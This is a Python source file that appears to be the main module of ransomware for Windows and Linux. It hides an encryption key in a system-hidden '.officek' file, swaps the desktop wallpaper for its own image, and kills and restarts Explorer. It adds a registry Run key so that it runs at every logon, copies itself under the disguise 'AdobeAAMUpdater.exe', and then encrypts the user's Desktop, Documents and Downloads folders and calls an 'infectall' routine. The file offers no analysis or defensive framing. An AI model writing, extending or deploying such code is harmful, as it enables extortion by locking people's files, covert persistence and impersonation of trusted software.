from Func import Crypt
from Func import k
from os import path,getenv
from sys import argv
from os import system as sys
from platform import system
from shutil import copyfile
from winreg import *

s = system()

if s=='Windows':
	try:
		desktop = path.expanduser('~/Desktop')
	except:
		pass
	try:
		documents = path.expanduser('~/Documents')
	except:
		pass
	try:
		downloads = path.expanduser('~/Downloads')
	except:
		pass

	try:
		key = open(documents+'/.officek','wb')
		key.write(k)
		key.close()
		sys('cd '+documents)
		sys('attrib +s +h '+documents+'/.officek')
	except:
		try:
			key = open('C:/Users/Public/.officek','wb')
			key.write(k)
			key.close()
			sys('cd C:/Users/Public')
			sys('attrib +s +h C:/Users/Public/.officek')
		except:
			pass

	try:
		bg = Crypt.resource_path('bg.jpg')
	except:
		pass

	try:
		appdata = getenv('APPDATA')
		dest = appdata+'/Microsoft/Windows/Themes'
		copyfile(dest+'/TranscodedWallpaper',dest+'/.transold')
		copyfile(bg,dest+"/TranscodedWallpaper")
		sys('cd '+dest)
		sys('attrib +s +h '+dest+'/.transold')
		sys("taskkill /f /im explorer.exe")
		sys("start C:/Windows/explorer.exe")
	except:
		try:
			appdata = getenv('APPDATA')
			dest = appdata+'/Microsoft/Windows/Themes'
			copyfile(dest+'/TranscodedWallpaper.jpg',dest+'/.transold')
			copyfile(bg,dest+"/TranscodedWallpaper.jpg")
			sys('cd '+dest)
			sys('attrib +s +h '+dest+'/.transold')
			sys("taskkill /f /im explorer.exe")
			sys("start C:/Windows/explorer.exe")
		except:
			pass

	keypath = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
	try:
		key = CreateKey(HKEY_LOCAL_MACHINE, keypath)
	except PermissionError:
		key = CreateKey(HKEY_CURRENT_USER, keypath)
	
	try:
		copyfile(argv[0],'C:/Users/Public/AdobeAAMUpdater.exe')
		p = 'C:\\Users\\Public\\AdobeAAMUpdater.exe'
		SetValueEx(key, "AdobeAAM", 0, REG_SZ, p)
	except:
		pass

	Crypt.cryptingcommon(desktop)
	Crypt.cryptingcommon(documents)
	Crypt.cryptingcommon(downloads)

	Crypt.infectall()

elif s=='Linux':
	try:
		desktop = path.expanduser('~/Desktop')
	except:
		pass
	try:
		documents = path.expanduser('~/Documents')
	except:
		pass
	try:
		downloads = path.expanduser('~/Downloads')
	except:
		pass
	try:
		area = path.expanduser('~/Área de trabalho')
	except:
		pass
	try:
		documentos = path.expanduser('~/Documentos')
	except:
		pass

	try:
		key = open(documents+'/.officek','wb')
		key.write(k)
		key.close()
	except:
		pass
	try:
		key = open(documentos+'/.officek','wb')
		key.write(k)
		key.close()
	except:
		pass

	Crypt.cryptingcommon(desktop)
	Crypt.cryptingcommon(area)
	Crypt.cryptingcommon(documents)
	Crypt.cryptingcommon(documentos)
	Crypt.cryptingcommon(downloads)

	Crypt.infectall()